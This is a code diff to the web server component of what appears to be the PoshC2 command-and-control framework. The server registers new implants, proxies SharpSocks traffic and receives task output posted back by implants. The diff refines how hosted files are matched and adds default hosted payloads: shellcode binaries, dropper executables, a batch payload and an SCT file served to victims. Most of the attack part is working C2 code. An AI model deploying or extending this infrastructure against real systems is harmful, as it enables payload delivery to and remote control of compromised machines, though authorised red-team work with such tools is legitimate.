@@ -32,7 +32,6 @@ else:
 new_implant_url = None
 sharpurls = None
 cached_urls = None
-last_cached = None
 QuickCommandURI = None
 KEY = None
 
@@ -81,20 +80,16 @@ class MyHandler(BaseHTTPRequestHandler):
             """Respond to a GET request."""
             response_content_len = None
             response_code = 200
-            response_content_type = "text/html"  
+            response_content_type = "text/html"
             response_content = None
-            
 
-            # if (now - last_cached) > 30s:
-                # update_cache_urls
-                # make threadsafe use a lock or something           
             cached_urls = update_cache_urls()
 
             logging.info("GET request,\nPath: %s\nHeaders:\n%s\n", str(self.path), str(self.headers))
-            
+
             self.cookieHeader = self.headers.get('Cookie')
             self.ref = self.headers.get('Referer')
-            
+
             UriPath = str(self.path)
             sharplist = []
             for i in sharpurls:
@@ -118,7 +113,7 @@ class MyHandler(BaseHTTPRequestHandler):
                     open("%swebserver.log" % PoshProjectDirectory, "a").write("%s - [%s] Making GET connection to SharpSocks %s%s\r\n" % (self.address_string(), self.log_date_time_string(), SocksHost, UriPath))
                     r = Request("%s%s" % (SocksHost, UriPath), headers={'Accept-Encoding': 'gzip', 'Cookie': '%s' % self.cookieHeader, 'User-Agent': UserAgent})
                     res = urlopen(r)
-                    sharpout = res.read()                  
+                    sharpout = res.read()
                     response_content_len = len(sharpout)
                     if (len(sharpout) > 0):
                         response_content = sharpout
@@ -129,28 +124,31 @@ class MyHandler(BaseHTTPRequestHandler):
                 except Exception as e:
                     open("%swebserver.log" % PoshProjectDirectory, "a").write("[-] Error with SharpSocks - is SharpSocks running %s%s \r\n%s\r\n" % (SocksHost, UriPath, traceback.format_exc()))
                     open("%swebserver.log" % PoshProjectDirectory, "a").write("[-] SharpSocks  %s\r\n" % e)
-                    print(Colours.RED + f"Unknown C2 comms incoming (Could be old implant or sharpsocks) - {UriPath}" + Colours.END)
+                    print(Colours.RED + f"Unknown C2 comms incoming (Could be old implant or sharpsocks) - {self.client_address[0]} {UriPath}" + Colours.END)
                     response_code = 404
                     HTTPResponsePage = select_item("GET_404_Response", "C2Server")
                     if HTTPResponsePage:
                         response_content = bytes(HTTPResponsePage, "utf-8")
                     else:
                         response_content = bytes(GET_404_Response, "utf-8")
-         
+
             # dynamically hosted files
             elif [ele for ele in cached_urls if(ele[1] in self.path)]:
                 for i in cached_urls:
                     URL = CachedUrls(i[0], i[1], i[2], i[3], i[4], i[5])
-                    if URL.URI in self.path and URL.Active == "Yes":
-                        response_content = open(URL.FilePath, 'rb').read()
+                    if URL.URI == self.path or f"/{URL.URI}" == self.path and URL.Active == "Yes":
+                        try:
+                            response_content = open(URL.FilePath, 'rb').read()
+                        except FileNotFoundError as e:
+                            print_bad(f"Hosted file not found (src_addr: {self.client_address[0]}): {URL.URI} -> {e.filename}")
                         response_content_type = URL.ContentType
                         if URL.Base64 == "Yes":
-                            response_content = base64.b64encode(response_content)      
+                            response_content = base64.b64encode(response_content)
 
                         # do this for the python dropper only
                         if "_py" in URL.URI:
                             response_content = "a" + "".join("{:02x}".format(c) for c in response_content)
-                            response_content = bytes(response_content, "utf-8")                 
+                            response_content = bytes(response_content, "utf-8")
 
             # register new implant
             elif new_implant_url in self.path and self.cookieHeader.startswith("SessionID"):
@@ -250,7 +248,7 @@ class MyHandler(BaseHTTPRequestHandler):
             """Respond to a POST request."""
             response_content_len = None
             response_code = 200
-            response_content_type = "text/html"  
+            response_content_type = "text/html"
             response_content = None
 
             self.server_version = ServerHeader
@@ -264,10 +262,10 @@ class MyHandler(BaseHTTPRequestHandler):
                 cookieVal = (self.cookieHeader).replace("SessionID=", "")
             except:
                 cookieVal = ""
-            
+
             post_data = self.rfile.read(content_length)
             logging.info("POST request,\nPath: %s\nHeaders:\n%s\n\nBody:\n%s\n", str(self.path), str(self.headers), post_data)
-            newTaskOutput(self.path, cookieVal, post_data)            
+            newTaskOutput(self.path, cookieVal, post_data)
 
         except Exception as e:
             if 'broken pipe' not in str(e).lower():
@@ -309,7 +307,7 @@ class MyHandler(BaseHTTPRequestHandler):
                         response_content_len = len(sharpout)
                         open("%swebserver.log" % PoshProjectDirectory, "a").write("[-] Error with SharpSocks - is SharpSocks running %s%s\r\n%s\r\n" % (SocksHost, UriPath, traceback.format_exc()))
                         open("%swebserver.log" % PoshProjectDirectory, "a").write("[-] SharpSocks  %s\r\n" % e)
-                        print(Colours.RED + f"Unknown C2 comms incoming (Could be old implant or sharpsocks) - {UriPath}" + Colours.END)
+                        print(Colours.RED + f"Unknown C2 comms incoming (Could be old implant or sharpsocks) - {self.client_address[0]} {UriPath}" + Colours.END)
                         response_code = 404
                         HTTPResponsePage = select_item("GET_404_Response", "C2Server")
                         if HTTPResponsePage:
@@ -380,9 +378,11 @@ def newdb(db):
     # adding default hosted payloads
     QuickCommandURI = select_item("QuickCommand", "C2Server")
     insert_hosted_file("%ss/86/portal" % QuickCommandURI, "%sSharp_v4_x86_Shellcode.bin" % (PayloadsDirectory), "text/html", "Yes", "Yes")
-    insert_hosted_file("%ss/86/portal" % QuickCommandURI, "%sSharp_v4_x64_Shellcode.bin" % (PayloadsDirectory), "text/html", "Yes", "Yes")
-    insert_hosted_file("%ss/86/portal" % QuickCommandURI, "%sPosh32.exe" % (PayloadsDirectory), "application/x-msdownload", "No", "Yes")
-    insert_hosted_file("%ss/86/portal" % QuickCommandURI, "%sPosh64.exe" % (PayloadsDirectory), "application/x-msdownload", "No", "Yes")
+    insert_hosted_file("%ss/64/portal" % QuickCommandURI, "%sSharp_v4_x64_Shellcode.bin" % (PayloadsDirectory), "text/html", "Yes", "Yes")
+    insert_hosted_file("%sp/86/portal" % QuickCommandURI, "%sPosh_v4_x86_Shellcode.bin" % (PayloadsDirectory), "application/x-msdownload", "No", "Yes")
+    insert_hosted_file("%sp/64/portal" % QuickCommandURI, "%sPosh_v4_x64_Shellcode.bin" % (PayloadsDirectory), "application/x-msdownload", "No", "Yes")
+    insert_hosted_file("%s_ex86" % QuickCommandURI, "%sPosh_v4_dropper_32.exe" % (PayloadsDirectory), "application/x-msdownload", "No", "Yes")
+    insert_hosted_file("%s_ex64" % QuickCommandURI, "%sPosh_v4_dropper_64.exe" % (PayloadsDirectory), "application/x-msdownload", "No", "Yes")
     insert_hosted_file("%s_bs" % QuickCommandURI, "%spayload.bat" % (PayloadsDirectory), "text/html", "No", "Yes")
     insert_hosted_file("%s_rp" % QuickCommandURI, "%spayload.txt" % (PayloadsDirectory), "text/html", "Yes", "Yes")
     insert_hosted_file("%s_rg" % QuickCommandURI, "%srg_sct.xml" % (PayloadsDirectory), "text/html", "No", "Yes")
@@ -471,8 +471,8 @@ def main(args):
     print("WEBSERVER Log: %swebserver.log" % PoshProjectDirectory)
     print("")
     print("PayloadCommsHost: " + select_item("PayloadCommsHost", "C2Server") + Colours.GREEN)
-    print("DomainFrontHeader: " + str(select_item("DomainFrontHeader", "C2Server")) + Colours.GREEN)    
-    QuickCommandURI = select_item("QuickCommand", "C2Server")    
+    print("DomainFrontHeader: " + str(select_item("DomainFrontHeader", "C2Server")) + Colours.GREEN)
+    QuickCommandURI = select_item("QuickCommand", "C2Server")
     KEY = get_baseenckey()
     new_implant_url = get_newimplanturl()
     sharpurls= get_sharpurls().split(",")
@@ -501,7 +501,7 @@ def main(args):
     c2_message_thread = threading.Thread(target=log_c2_messages, daemon=True)
     c2_message_thread.start()
 
-    try:       
+    try:
         httpd.serve_forever()
     except (KeyboardInterrupt, EOFError):
         httpd.server_close()
